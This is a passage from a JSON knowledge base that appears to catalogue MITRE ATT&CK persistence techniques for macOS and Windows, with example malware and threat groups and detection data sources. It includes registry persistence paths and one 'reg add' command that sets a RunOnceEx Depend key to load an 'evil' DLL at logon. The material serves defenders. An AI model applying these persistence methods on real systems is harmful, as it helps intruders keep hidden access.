            "Description": "Mach-O binaries have a series of headers that are used to perform certain operations when a binary is loaded. The LC_LOAD_DYLIB header in a Mach-O binary tells macOS and OS X which dynamic libraries (dylibs) to load during execution time. These can be added ad-hoc to the compiled binary as long adjustments are made to the rest of the fields and dependencies [1]. There are tools available to perform these changes. Any changes will invalidate digital signatures on binaries because the binary is being modified. Adversaries can remediate this issue by simply removing the LC_CODE_SIGNATURE command from the binary so that the signature isn’t checked at load time [2].\n",
            "ID": "T1161",
            "Tactic": "Persistence",
            "Platform: ": "macOS",
            "Permissions Required: ": "User",
            "Data Sources: ": "Binary file metadata, Process monitoring, Process command-line parameters, File monitoring",
            "Version": "1.0"
        },
        "Login Item": {
            "Name": "Login Item",
            "Description": "MacOS provides the option to list specific applications to run when a user logs in. These applications run under the logged in user's context, and will be started every time the user logs in. Login items installed using the Service Management Framework are not visible in the System Preferences and can only be removed by the application that created them [1]. Users have direct control over login items installed using a shared file list which are also visible in System Preferences [1]. These login items are stored in the user's ~/Library/Preferences/ directory in a plist file called com.apple.loginitems.plist [2]. Some of these applications can open visible dialogs to the user, but they don’t all have to since there is an option to ‘Hide’ the window. If an adversary can register their own login item or modified an existing one, then they can use it to execute their code for a persistence mechanism each time the user logs in [3] [4]. The API method  SMLoginItemSetEnabled  can be used to set Login Items, but scripting languages like AppleScript can do this as well  [1].\n",
            "ID": "T1162",
            "Tactic": "Persistence",
            "Platform: ": "macOS",
            "Permissions Required: ": "User",
            "Data Sources: ": "File monitoring, API monitoring",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "Dok",
                    "Description": "Dok persists via a login item.[5]"
                }
            ]
        },
        "Logon Scripts": {
            "Name": "Logon Scripts",
            "Description": "WindowsWindows allows logon scripts to be run whenever a specific user or group of users log into a system. [1] The scripts can be used to perform administrative functions, which may often execute other programs or send information to an internal logging server.If adversaries can access these scripts, they may insert additional code into the logon script to execute their tools when a user logs in. This code can allow them to maintain persistence on a single system, if it is a local script, or to move laterally within a network, if the script is stored on a central server and pushed to many systems. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary.MacMac allows login and logoff hooks to be run as root whenever a specific user logs into or out of a system. A login hook tells Mac OS X to execute a certain script when a user logs in, but unlike startup items, a login hook executes as root [2]. There can only be one login hook at a time though. If adversaries can access these scripts, they can insert additional code to the script to execute their tools when a user logs in.\n",
            "ID": "T1037",
            "Tactic": "Lateral Movement, Persistence",
            "Platform: ": "macOS, Windows",
            "Data Sources: ": "File monitoring, Process monitoring",
            "CAPEC ID: ": "CAPEC-564",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "APT28",
                    "Description": "An APT28 loader Trojan adds the Registry key HKCU\\Environment\\UserInitMprLogonScript to establish persistence.[3]"
                },
                {
                    "Name": "JHUHUGIT",
                    "Description": "JHUHUGIT has registered a Windows shell script under the Registry key HKCU\\Environment\\UserInitMprLogonScript to establish persistence.[4]"
                }
            ]
        },
        "Modify Existing Service": {
            "Name": "Modify Existing Service",
            "Description": "Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Registry. Service configurations can be modified using utilities such as sc.exe and Reg.Adversaries can modify an existing service to persist malware on a system by using system utilities or by using custom tools to interact with the Windows API. Use of existing services is a type of Masquerading that may make detection analysis more challenging. Modifying existing services may interrupt their functionality or may enable services that are disabled or otherwise not commonly used.Adversaries may also intentionally corrupt or kill services to execute malicious recovery programs/commands. [1] [2]\n",
            "ID": "T1031",
            "Tactic": "Persistence",
            "Platform: ": "Windows",
            "Permissions Required: ": "Administrator, SYSTEM",
            "Data Sources: ": "Windows Registry, File monitoring, Process monitoring, Process command-line parameters",
            "CAPEC ID: ": "CAPEC-551",
            "Contributors: ": "Travis Smith, Tripwire; Matthew Demaske, Adaptforward",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "APT19",
                    "Description": "An APT19 Port 22 malware variant registers itself as a service.[3]"
                },
                {
                    "Name": "Bankshot",
                    "Description": "Bankshot can terminate a specific process by its process id.[4][5]"
                },
                {
                    "Name": "BBSRAT",
                    "Description": "BBSRAT can modify service configurations.[6]"
                },
                {
                    "Name": "Honeybee",
                    "Description": "Honeybee has batch files that modify the system service COMSysApp to load a malicious DLL.[7]"
                },
                {
                    "Name": "PoisonIvy",
                    "Description": "PoisonIvy creates a Registry entry modifying the Logical Disk Manager service to point to a malicious DLL dropped to disk.[8]"
                },
                {
                    "Name": "PowerSploit",
                    "Description": "PowerSploit contains a collection of Privesc-PowerUp modules that can discover and replace/modify service binaries, paths, and configs.[9][10]"
                },
                {
                    "Name": "TYPEFRAME",
                    "Description": "TYPEFRAME can delete services from the victim’s machine.[11]"
                },
                {
                    "Name": "Volgmer",
                    "Description": "Volgmer installs a copy of itself in a randomly selected service, then overwrites the ServiceDLL entry in the service's Registry entry.[12]"
                }
            ]
        },
        "Netsh Helper DLL": {
            "Name": "Netsh Helper DLL",
            "Description": "Netsh.exe (also referred to as Netshell) is a command-line scripting utility used to interact with the network configuration of a system. It contains functionality to add helper DLLs for extending functionality of the utility. [1] The paths to registered netsh.exe helper DLLs are entered into the Windows Registry at HKLM\\SOFTWARE\\Microsoft\\Netsh.Adversaries can use netsh.exe with helper DLLs to proxy execution of arbitrary code in a persistent manner when netsh.exe is executed automatically with another Persistence technique or if other persistent software is present on the system that executes netsh.exe as part of its normal functionality. Examples include some VPN software that invoke netsh.exe. [2]Proof of concept code exists to load Cobalt Strike's payload using netsh.exe helper DLLs. [3]\n",
            "ID": "T1128",
            "Tactic": "Persistence",
            "Platform: ": "Windows",
            "Permissions Required: ": "Administrator, SYSTEM",
            "Data Sources: ": "DLL monitoring, Windows Registry, Process monitoring",
            "Contributors: ": "Matthew Demaske, Adaptforward",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "netsh",
                    "Description": "netsh can be used as a persistence proxy technique to execute a helper DLL when netsh.exe is executed.[2]"
                }
            ]
        },
        "New Service": {
            "Name": "New Service",
            "Description": "When operating systems boot up, they can start programs or applications called services that perform background system functions. [1] A service's configuration information, including the file path to the service's executable, is stored in the Windows Registry. Adversaries may install a new service that can be configured to execute at startup by using utilities to interact with services or by directly modifying the Registry. The service name may be disguised by using a name from a related operating system or benign software with Masquerading. Services may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges from administrator to SYSTEM. Adversaries may also directly start services through Service Execution.\n",
            "ID": "T1050",
            "Tactic": "Persistence, Privilege Escalation",
            "Platform: ": "Windows",
            "Permissions Required: ": "Administrator, SYSTEM",
            "Effective Permissions: ": "SYSTEM",
            "Data Sources: ": "Windows Registry, Process monitoring, Process command-line parameters, Windows event logs",
            "CAPEC ID: ": "CAPEC-550",
            "Contributors: ": "Pedro Harrison",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "APT3",
                    "Description": "APT3 has a tool that creates a new service for persistence.[2]"
                },
                {
                    "Name": "APT32",
                    "Description": "APT32 creates a Windows service to establish persistence.[3]"
                },
                {
                    "Name": "BlackEnergy",
                    "Description": "One variant of BlackEnergy creates a new service using either a hard-coded or randomly generated name.[4]"
                },
                {
                    "Name": "Briba",
                    "Description": "Briba installs a service pointing to a malicious DLL dropped to disk.[5]"
                },
                {
                    "Name": "Carbanak",
                    "Description": "Carbanak malware installs itself as a service to provide persistence and SYSTEM privileges.[6]"
                },
                {
                    "Name": "Catchamas",
                    "Description": "Catchamas adds a new service named NetAdapter to establish persistence.[7]"
                },
                {
                    "Name": "Cobalt Group",
                    "Description": "Cobalt Group has created new services to establish persistence.[8]"
                },
                {
                    "Name": "Cobalt Strike",
                    "Description": "Cobalt Strike can install a new service.[9]"
                },
                {
                    "Name": "CosmicDuke",
                    "Description": "CosmicDuke uses Windows services typically named \"javamtsup\" for persistence.[10]"
                },
                {
                    "Name": "CozyCar",
                    "Description": "One persistence mechanism used by CozyCar is to register itself as a Windows service.[11]"
                },
                {
                    "Name": "Duqu",
                    "Description": "Duqu creates a new service that loads a malicious driver when the system starts. When Duqu is active, the operating system believes that the driver is legitimate, as it has been signed with a valid private key.[12]"
                },
                {
                    "Name": "Dyre",
                    "Description": "Dyre registers itself as a service by adding several Registry keys.[13]"
                },
                {
                    "Name": "Elise",
                    "Description": "Elise configures itself as a service.[14]"
                },
                {
                    "Name": "Emissary",
                    "Description": "Emissary is capable of configuring itself as a service.[15]"
                },
                {
                    "Name": "FIN7",
                    "Description": "FIN7 created new Windows services and added them to the startup directories for persistence.[16]"
                },
                {
                    "Name": "FinFisher",
                    "Description": "FinFisher creates a new Windows service with the malicious executable for persistence.[17][18]"
                },
                {
                    "Name": "hcdLoader",
                    "Description": "hcdLoader installs itself as a service for persistence.[19][20]"
                },
                {
                    "Name": "Hydraq",
                    "Description": "Hydraq creates new services to establish persistence.[21][22][23]"
                },
                {
                    "Name": "InnaputRAT",
                    "Description": "Some InnaputRAT variants create a new Windows service to establish persistence.[24]"
                },
                {
                    "Name": "JHUHUGIT",
                    "Description": "JHUHUGIT has registered itself as a service to establish persistence.[25]"
                },
                {
                    "Name": "Kazuar",
                    "Description": "Kazuar can install itself as a new service.[26]"
                },
                {
                    "Name": "Ke3chang",
                    "Description": "Ke3chang backdoor RoyalDNS established persistence through adding a service called Nwsapagent.[27]"
                },
                {
                    "Name": "Kwampirs",
                    "Description": "Kwampirs creates a new service named WmiApSrvEx to establish persistence.[28]"
                },
                {
                    "Name": "Lazarus Group",
                    "Description": "Several Lazarus Group malware families install themselves as new services on victims.[29][30]"
                },
                {
                    "Name": "MoonWind",
                    "Description": "MoonWind installs itself as a new service with automatic startup to establish persistence. The service checks every 60 seconds to determine if the malware is running; if not, it will spawn a new instance.[31]"
                },
                {
                    "Name": "Naid",
                    "Description": "Naid creates a new service to establish.[32]"
                },
                {
                    "Name": "Nerex",
                    "Description": "Nerex creates a Registry subkey that registers a new service.[33]"
                },
                {
                    "Name": "Nidiran",
                    "Description": "Nidiran can create a new service named msamger (Microsoft Security Accounts Manager).[34]"
                },
                {
                    "Name": "PlugX",
                    "Description": "PlugX can be added as a service to establish persistence.[35][36][37][38]"
                },
                {
                    "Name": "PoisonIvy",
                    "Description": "PoisonIvy creates a Registry subkey that registers a new service.[39]"
                },
                {
                    "Name": "RawPOS",
                    "Description": "RawPOS installs itself as a service to maintain persistence.[40][41][42]"
                },
                {
                    "Name": "Reaver",
                    "Description": "Reaver installs itself as a new service.[43]"
                },
                {
                    "Name": "Sakula",
                    "Description": "Some Sakula samples install themselves as services for persistence by calling WinExec with the net start argument.[44]"
                },
                {
                    "Name": "Shamoon",
                    "Description": "Shamoon creates a new service named \"ntssrv\" to execute the payload.[45]"
                },
                {
                    "Name": "StreamEx",
                    "Description": "StreamEx establishes persistence by installing a new service pointing to its DLL and setting the service to auto-start.[46]"
                },
                {
                    "Name": "TDTESS",
                    "Description": "If running as administrator, TDTESS installs itself as a new service named bmwappushservice to establish persistence.[47]"
                },
                {
                    "Name": "Threat Group-3390",
                    "Description": "A Threat Group-3390 tool can create a new service, naming it after the config information, to gain persistence.[48]"
                },
                {
                    "Name": "TinyZBot",
                    "Description": "TinyZBot can install as a Windows service for persistence.[49]"
                },
                {
                    "Name": "TYPEFRAME",
                    "Description": "TYPEFRAME variants can add malicious DLL modules as new services.[50]"
                },
                {
                    "Name": "Volgmer",
                    "Description": "Some Volgmer variants install .dll files as services with names generated by a list of hard-coded strings.[51][52]"
                },
                {
                    "Name": "Wiarp",
                    "Description": "Wiarp creates a backdoor through which remote attackers can create a service.[53]"
                },
                {
                    "Name": "Wingbird",
                    "Description": "Wingbird uses services.exe to register a new autostart service named \"Audit Service\" using a copy of the local lsass.exe file.[54][55]"
                },
                {
                    "Name": "Winnti",
                    "Description": "Winnti sets its DLL file as a new service in the Registry to establish persistence.[56]"
                },
                {
                    "Name": "ZeroT",
                    "Description": "ZeroT can add a new service to ensure PlugX persists on the system when delivered as another payload onto the system.[38]"
                },
                {
                    "Name": "ZLib",
                    "Description": "ZLib creates Registry keys to allow itself to run as various services.[57]"
                }
            ]
        },
        "Office Application Startup": {
            "Name": "Office Application Startup",
            "Description": "Microsoft Office is a fairly common application suite on Windows-based operating systems within an enterprise network. There are multiple mechanisms that can be used with Office for persistence when an Office-based application is started.Office Template MacrosMicrosoft Office contains templates that are part of common Office applications and are used to customize styles. The base templates within the application are used each time an application starts. [1]Office Visual Basic for Applications (VBA) macros [2] can inserted into the base templated and used to execute code when the respective Office application starts in order to obtain persistence. Examples for both Word and Excel have been discovered and published. By default, Word has a Normal.dotm template created that can be modified to include a malicious macro. Excel does not have a template file created by default, but one can be added that will automatically be loaded. [3] [4]Word Normal.dotm location:C:\\Users(username)\\AppData\\Roaming\\Microsoft\\Templates\\Normal.dotmExcel Personal.xlsb location:C:\\Users(username)\\AppData\\Roaming\\Microsoft\\Excel\\XLSTART\\PERSONAL.XLSBAn adversary may need to enable macros to execute unrestricted depending on the system or enterprise security policy on use of macros.Office TestA Registry location was found that when a DLL reference was placed within it the corresponding DLL pointed to by the binary path would be executed every time an Office application is started [5]HKEY_CURRENT_USER\\Software\\Microsoft\\Office test\\Special\\PerfAdd-insOffice add-ins can be used to add functionality to Office programs. [6]Add-ins can also be used to obtain persistence because they can be set to execute code when an Office application starts. There are different types of add-ins that can be used by the various Office products; including Word/Excel add-in Libraries (WLL/XLL), VBA add-ins, Office Component Object Model (COM) add-ins, automation add-ins, VBA Editor (VBE), and Visual Studio Tools for Office (VSTO) add-ins. [7]\n",
            "ID": "T1137",
            "Tactic": "Persistence",
            "Platform: ": "Windows",
            "Permissions Required: ": "User, Administrator",
            "Data Sources: ": "Process monitoring, Process command-line parameters, Windows Registry, File monitoring",
            "Contributors: ": "Loic Jaquemet; Ricardo Dias",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "APT28",
                    "Description": "APT28 has used the Office Test persistence mechanism within Microsoft Office by adding the Registry key HKCU\\Software\\Microsoft\\Office test\\Special\\Perf to execute code.[8]"
                }
            ]
        },
        "Path Interception": {
            "Name": "Path Interception",
            "Description": "Path interception occurs when an executable is placed in a specific path so that it is executed by an application instead of the intended target. One example of this was the use of a copy of cmd in the current working directory of a vulnerable application that loads a CMD or BAT file with the CreateProcess function. [1]There are multiple distinct weaknesses or misconfigurations that adversaries may take advantage of when performing path interception: unquoted paths, path environment variable misconfigurations, and search order hijacking. The first vulnerability deals with full program paths, while the second and third occur when program paths are not specified. These techniques can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.Unquoted PathsService paths (stored in Windows Registry keys) [2] and shortcut paths are vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g., C:\\unsafe path with space\\program.exe vs. \"C:\\safe path with space\\program.exe\"). [3] An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is C:\\program files\\myapp.exe, an adversary may create a program at C:\\program.exe that will be run instead of the intended program. [4] [5]PATH Environment Variable MisconfigurationThe PATH environment variable contains a list of directories. Certain methods of executing a program (namely using cmd.exe or the command-line) rely solely on the PATH environment variable to determine the locations that are searched for a program when the path for the program is not given. If any directories are listed in the PATH environment variable before the Windows directory, %SystemRoot%\\system32 (e.g., C:\\Windows\\system32), a program may be placed in the preceding directory that is named the same as a Windows program (such as cmd, PowerShell, or Python), which will be executed when that command is executed from a script or command-line.For example, if C:\\example path precedes C:\\Windows\\system32 is in the PATH environment variable, a program that is named net.exe and placed in C:\\example path will be called instead of the Windows system \"net\" when \"net\" is executed from the command-line.Search Order HijackingSearch order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. The search order differs depending on the method that is used to execute the program. [6] [7] [8] However, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory. An adversary who finds a program vulnerable to search order hijacking (i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program's directory.For example, \"example.exe\" runs \"cmd.exe\" with the command-line argument net user. An adversary may place a program called \"net.exe\" within the same directory as example.exe, \"net.exe\" will be run instead of the Windows system utility net. In addition, if an adversary places a program called \"net.com\" in the same directory as \"net.exe\", then cmd.exe /C net user will execute \"net.com\" instead of \"net.exe\" due to the order of executable extensions defined under PATHEXT. [9]Search order hijacking is also a common practice for hijacking DLL loads and is covered in DLL Search Order Hijacking.\n",
            "ID": "T1034",
            "Tactic": "Persistence, Privilege Escalation",
            "Platform: ": "Windows",
            "Permissions Required: ": "User, Administrator, SYSTEM",
            "Effective Permissions: ": "User, Administrator, SYSTEM",
            "Data Sources: ": "File monitoring, Process monitoring",
            "CAPEC ID: ": "CAPEC-159",
            "Contributors: ": "Stefan Kanthak",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "PowerSploit",
                    "Description": "PowerSploit contains a collection of Privesc-PowerUp modules that can discover and exploit various path interception opportunities in services, processes, and variables.[10][11]"
                }
            ]
        },
        "Plist Modification": {
            "Name": "Plist Modification",
            "Description": "Property list (plist) files contain all of the information that macOS and OS X uses to configure applications and services. These files are UTF-8 encoded and formatted like XML documents via a series of keys surrounded by < >. They detail when programs should execute, file paths to the executables, program arguments, required OS permissions, and many others. plists are located in certain locations depending on their purpose such as /Library/Preferences (which execute with elevated privileges) and ~/Library/Preferences (which execute with a user's privileges). Adversaries can modify these plist files to point to their own code, can use them to execute their code in the context of another user, bypass whitelisting procedures, or even use them as a persistence mechanism. [1]\n",
            "ID": "T1150",
            "Tactic": "Defense Evasion, Persistence, Privilege Escalation",
            "Platform: ": "macOS",
            "Permissions Required: ": "User, Administrator",
            "Data Sources: ": "File monitoring, Process monitoring, Process command-line parameters",
            "Defense Bypassed: ": "Application whitelisting, Process whitelisting, Whitelisting by file name or path",
            "Version": "1.0"
        },
        "Port Knocking": {
            "Name": "Port Knocking",
            "Description": "Port Knocking is a well-established method used by both defenders and adversaries to hide open ports from access. To enable a port, an adversary sends a series of packets with certain characteristics before the port will be opened. Usually this series of packets consists of attempted connections to a predefined sequence of closed ports, but can involve unusual flags, specific strings or other unique characteristics. After the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software. This technique has been observed to both for the dynamic opening of a listening port as well as the initiating of a connection to a listening server on a different system.The observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r [1], is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.\n",
            "ID": "T1205",
            "Tactic": "Defense Evasion, Persistence, Command And Control",
            "Platform: ": "Linux, macOS",
            "Permissions Required: ": "User",
            "Requires Network: ": "Yes",
            "Defense Bypassed: ": "Defensive network service scanning",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "Chaos",
                    "Description": "Chaos provides a reverse shell is triggered upon receipt of a packet with a special string, sent to any port.[2]"
                },
                {
                    "Name": "Umbreon",
                    "Description": "Umbreon provides additional access using its backdoor Espeon, providing a reverse shell upon receipt of a special packet[3]"
                }
            ]
        },
        "Port Monitors": {
            "Name": "Port Monitors",
            "Description": "A port monitor can be set through the  [1] API call to set a DLL to be loaded at startup. [1] This DLL can be located in C:\\Windows\\System32 and will be loaded by the print spooler service, spoolsv.exe, on boot. The spoolsv.exe process also runs under SYSTEM level permissions. [2] Alternatively, an arbitrary DLL can be loaded if permissions allow writing a fully-qualified pathname for that DLL to HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors. The Registry key contains entries for the following: Local Port Standard TCP/IP Port USB Monitor WSD PortAdversaries can use this technique to load malicious code at startup that will persist on system reboot and execute as SYSTEM.\n",
            "ID": "T1013",
            "Tactic": "Persistence, Privilege Escalation",
            "Platform: ": "Windows",
            "Permissions Required: ": "Administrator, SYSTEM",
            "Effective Permissions: ": "SYSTEM",
            "Data Sources: ": "File monitoring, API monitoring, DLL monitoring, Windows Registry, Process monitoring",
            "Contributors: ": "Stefan Kanthak; Travis Smith, Tripwire",
            "Version": "1.0"
        },
        "Rc.common": {
            "Name": "Rc.common",
            "Description": "During the boot process, macOS executes source /etc/rc.common, which is a shell script containing various utility functions. This file also defines routines for processing command-line arguments and for gathering system settings, and is thus recommended to include in the start of Startup Item Scripts [1]. In macOS and OS X, this is now a deprecated technique in favor of launch agents and launch daemons, but is currently still used.Adversaries can use the rc.common file as a way to hide code for persistence that will execute on each reboot as the root user [2].\n",
            "ID": "T1163",
            "Tactic": "Persistence",
            "Platform: ": "macOS",
            "Permissions Required: ": "root",
            "Data Sources: ": "File monitoring, Process monitoring",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "iKitten",
                    "Description": "iKitten adds an entry to the rc.common file for persistence.[3]"
                }
            ]
        },
        "Re-opened Applications": {
            "Name": "Re-opened Applications",
            "Description": "Starting in Mac OS X 10.7 (Lion), users can specify certain applications to be re-opened when a user reboots their machine. While this is usually done via a Graphical User Interface (GUI) on an app-by-app basis, there are property list files (plist) that contain this information as well located at ~/Library/Preferences/com.apple.loginwindow.plist and ~/Library/Preferences/ByHost/com.apple.loginwindow.* .plist. An adversary can modify one of these files directly to include a link to their malicious executable to provide a persistence mechanism each time the user reboots their machine [1].\n",
            "ID": "T1164",
            "Tactic": "Persistence",
            "Platform: ": "macOS",
            "Permissions Required: ": "User",
            "Version": "1.0"
        },
        "Redundant Access": {
            "Name": "Redundant Access",
            "Description": "Adversaries may use more than one remote access tool with varying command and control protocols as a hedge against detection. If one type of tool is detected and blocked or removed as a response but the organization did not gain a full understanding of the adversary's tools and access, then the adversary will be able to retain access to the network. Adversaries may also attempt to gain access to Valid Accounts to use External Remote Services such as external VPNs as a way to maintain access despite interruptions to remote access tools deployed within a target network. [1]Use of a Web Shell is one such way to maintain access to a network through an externally accessible Web server.\n",
            "ID": "T1108",
            "Tactic": "Defense Evasion, Persistence",
            "Platform: ": "Linux, macOS, Windows",
            "Permissions Required: ": "User, Administrator, SYSTEM",
            "Data Sources: ": "Process monitoring, Process use of network, Packet capture, Network protocol analysis, File monitoring, Authentication logs, Binary file metadata",
            "Defense Bypassed: ": "Network intrusion detection system, Anti-virus",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "3PARA RAT",
                    "Description": "3PARA RAT will sleep until after a date/time value loaded from a .dat file has passed. This allows the RAT to remain dormant until a set date, which could allow a means to regain access if other parts of the actors' toolset are removed from a victim.[2]"
                },
                {
                    "Name": "APT3",
                    "Description": "APT3 has been known to use multiple backdoors per campaign.[3]"
                },
                {
                    "Name": "Cobalt Group",
                    "Description": "Cobalt Group has used TeamViewer to preserve remote access in case control using the Cobalt Strike module was lost.[4]"
                },
                {
                    "Name": "FIN5",
                    "Description": "FIN5 maintains access to victim environments by using Valid Accounts to access External Remote Services as well as establishing a backup RDP tunnel by using FLIPSIDE.[5]"
                },
                {
                    "Name": "Leafminer",
                    "Description": "Leafminer used a tool called Imecab to set up a persistent remote access account on the victim machine.[6]"
                },
                {
                    "Name": "OilRig",
                    "Description": "OilRig has used RGDoor via Web shell to establish redundant access. The group has also used harvested credentials to gain access to Internet-accessible resources such as Outlook Web Access, which could be used for redundant access.[7]"
                },
                {
                    "Name": "Threat Group-3390",
                    "Description": "Threat Group-3390 has deployed backup web shells and obtained OWA account credentials during intrusions that it subsequently used to attempt to regain access when evicted from a victim network.[8]"
                }
            ]
        },
        "Registry Run Keys / Startup Folder": {
            "Name": "Registry Run Keys / Startup Folder",
            "Description": "Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. [1] These programs will be executed under the context of the user and will have the account's associated permissions level.The following run keys are created by default on Windows systems: HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceThe HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx is also available but is not created by default on Windows Visa and newer. Registry run key entries can reference programs directly or list them as a dependency. [2] For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil[.]dll\" [3]The following Registry keys can be used to set startup folder items for persistence: HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell FoldersAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use Masquerading to make the Registry entries look as if they are associated with legitimate programs.\n",
            "ID": "T1060",
            "Tactic": "Persistence",
            "Platform: ": "Windows",
            "Permissions Required: ": "User, Administrator",
            "Data Sources: ": "Windows Registry, File monitoring",
            "CAPEC ID: ": "CAPEC-270",
            "Contributors: ": "Oddvar Moe, @oddvarmoe",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "ADVSTORESHELL",
                    "Description": "ADVSTORESHELL achieves persistence by adding itself to the HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run Registry key.[4][5][6]"
                },
                {
                    "Name": "APT19",
                    "Description": "An APT19 HTTP malware variant establishes persistence by setting the Registry key HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Windows Debug Tools-%LOCALAPPDATA%\\.[7]"
                },
                {
                    "Name": "APT29",
                    "Description": "APT29 added Registry Run keys to establish persistence.[8]"
                },
                {
                    "Name": "APT3",
                    "Description": "APT3 places scripts in the startup folder for persistence.[9]"
                },
                {
                    "Name": "APT37",
                    "Description": "APT37's has added persistence via the Registry key HKCU\\Software\\Microsoft\\CurrentVersion\\Run\\.[10][11]"
                },
                {
                    "Name": "Backdoor.Oldrea",
                    "Description": "Backdoor.Oldrea adds Registry Run keys to achieve persistence.[12]"
                },
                {
                    "Name": "BACKSPACE",
                    "Description": "BACKSPACE achieves persistence by creating a shortcut to itself in the CSIDL_STARTUP directory.[13]"
                },
                {
                    "Name": "BADNEWS",
                    "Description": "BADNEWS installs a registry Run key to establish persistence.[14]"
                },
                {
                    "Name": "BBSRAT",
                    "Description": "BBSRAT has been loaded through DLL side-loading of a legitimate Citrix executable that is set to persist through the registry run key location: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\ssonsvr.exe"
                },
                {
                    "Name": "Bisonal",
                    "Description": "Bisonal adds itself to the Registry key HKEY_CURRENT_USER\\Software\\Microsoft\\CurrentVersion\\Run\\ for persistence.[15]"
                },
                {
                    "Name": "BlackEnergy",
                    "Description": "The BlackEnergy 3 variant drops its main DLL component and then creates a .lnk shortcut to that file in the startup folder.[16]"
                },
                {
                    "Name": "Briba",
                    "Description": "Briba creates run key Registry entries pointing to malicious DLLs dropped to disk.[17]"
                },
                {
                    "Name": "BRONZE BUTLER",
                    "Description": "BRONZE BUTLER has used a batch script that adds a Registry Run key to establish malware persistence.[18]"
                },
                {
                    "Name": "Carbanak",
                    "Description": "Carbanak stores a configuration files in the startup directory to automatically execute commands in order to persist across reboots.[19]"
                },
                {
                    "Name": "ChChes",
                    "Description": "ChChes establishes persistence by adding a Registry Run key.[20]"
                },
                {
                    "Name": "Cobalt Group",
                    "Description": "Cobalt Group has used Registry Run keys for persistence. The group has also set a Startup path to launch the PowerShell shell command and download Cobalt Strike.[21]"
                },
                {
                    "Name": "Comnie",
                    "Description": "Comnie achieves persistence by adding a shortcut of itself to the startup path in the Registry.[22]"
                },
                {
                    "Name": "CORESHELL",
                    "Description": "CORESHELL has established persistence by creating autostart extensibility point (ASEP) Registry entries in the Run key and other Registry keys, as well as by creating shortcuts in the Internet Explorer Quick Start folder.[23]"
                },
                {
                    "Name": "CozyCar",
                    "Description": "One persistence mechanism used by CozyCar is to set itself to be executed at system startup by adding a Registry value under one of the following Registry keys: HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run[24]"
                },
                {
                    "Name": "CrossRAT",
                    "Description": "CrossRAT uses run keys for persistence on Windows"
                },
                {
                    "Name": "Dark Caracal",
                    "Description": "Dark Caracal's version of Bandook adds a registry key to HKEY_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Run for persistence.[25]"
                },
                {
                    "Name": "Darkhotel",
                    "Description": "Darkhotel has been known to establish persistence by adding programs to the Run Registry key.[26]"
                },
                {
                    "Name": "DownPaper",
                    "Description": "DownPaper uses PowerShell to add a Registry Run key in order to establish persistence.[27]"
                },
                {
                    "Name": "Dragonfly 2.0",
                    "Description": "Dragonfly 2.0 added the registry value ntdll to the Registry Run key to establish persistence.[28]"
                },
                {
                    "Name": "DustySky",
                    "Description": "DustySky achieves persistence by creating a Registry entry in HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run.[29]"
                },
                {
                    "Name": "Elise",
                    "Description": "If establishing persistence by installation as a new service fails, one variant of Elise establishes persistence for the created .exe file by setting the following Registry key: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\svchost : %APPDATA%\\Microsoft\\Network\\svchost.exe. Other variants have set the following Registry key for persistence: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\imejp : [self].[30]"
                },
                {
